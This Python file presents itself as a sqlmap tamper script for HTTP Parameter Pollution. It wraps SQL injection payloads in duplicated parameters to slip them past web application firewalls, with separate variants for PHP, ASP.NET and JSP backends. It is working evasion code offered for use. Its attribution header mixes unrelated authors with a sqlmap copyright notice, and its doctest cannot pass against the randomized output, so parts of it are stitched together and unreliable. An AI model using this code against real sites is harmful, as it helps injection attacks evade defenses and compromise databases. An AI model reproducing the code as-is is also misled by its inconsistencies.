#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Performs HTTP Parameter Pollution (HPP) by duplicating parameters
    to confuse WAF parsing while backend processes the malicious value

    Requirement:
        * GET or POST requests with parameters

    Tested against:
        * WAFs that only inspect first/last parameter occurrence
        * Backend servers: PHP, ASP.NET, Java (different HPP behaviors)
        * Cloudflare, ModSecurity, AWS WAF

    Notes:
        * Different backends handle duplicate parameters differently:
          - PHP: Takes LAST occurrence
          - ASP.NET: Concatenates with comma
          - JSP/Tomcat: Takes FIRST occurrence
          - Python/Flask: Takes FIRST occurrence
        * WAFs may only inspect one occurrence, missing the payload
        * This tamper adds benign duplicates around the payload

    Reference:
        * https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution

    >>> tamper('1 AND 1=1')
    '1&id=1 AND 1=1&id=1'
    """

    if payload:
        # Extract parameter name if present in the payload context
        # Default to common parameter names if not detectable
        param_names = ["id", "page", "cat", "item", "user", "query", "search"]
        param_name = random.choice(param_names)
        
        # Generate benign values that look legitimate
        benign_values = ["1", "0", "100", "test", "null", "undefined", "true"]
        benign_before = random.choice(benign_values)
        benign_after = random.choice(benign_values)
        
        # Strategy 1: Payload in the middle (for WAFs checking first/last only)
        # benign&payload&benign
        polluted = "%s&%s=%s&%s=%s" % (
            benign_before,
            param_name,
            payload,
            param_name,
            benign_after
        )
        
        return polluted
    
    return payload


def tamper_php_style(payload, **kwargs):
    """
    HPP variant optimized for PHP backends (takes last parameter)
    Puts payload as the LAST occurrence
    """
    
    if payload:
        param_name = "id"
        benign_values = ["1", "0", "test"]
        
        # PHP takes last, so: benign&benign&PAYLOAD
        parts = []
        for _ in range(random.randint(2, 4)):
            parts.append("%s=%s" % (param_name, random.choice(benign_values)))
        parts.append(payload)
        
        return "&".join(parts)
    
    return payload


def tamper_asp_style(payload, **kwargs):
    """
    HPP variant optimized for ASP.NET backends (concatenates with comma)
    Splits payload across multiple parameters
    """
    
    if payload:
        param_name = "id"
        
        # ASP.NET concatenates, so we can split the payload
        # This is more complex and payload-specific
        # For now, use standard pollution
        benign = "1"
        
        # benign&PAYLOAD (ASP will see: "1,PAYLOAD")
        return "%s=%s&%s=%s" % (param_name, benign, param_name, payload)
    
    return payload


def tamper_jsp_style(payload, **kwargs):
    """
    HPP variant optimized for JSP/Tomcat backends (takes first parameter)
    Puts payload as the FIRST occurrence
    """
    
    if payload:
        param_name = "id"
        benign_values = ["1", "0", "test"]
        
        # JSP takes first, so: PAYLOAD&benign&benign
        parts = [payload]
        for _ in range(random.randint(2, 4)):
            parts.append("%s=%s" % (param_name, random.choice(benign_values)))
        
        return "&".join(parts)
    
    return payload
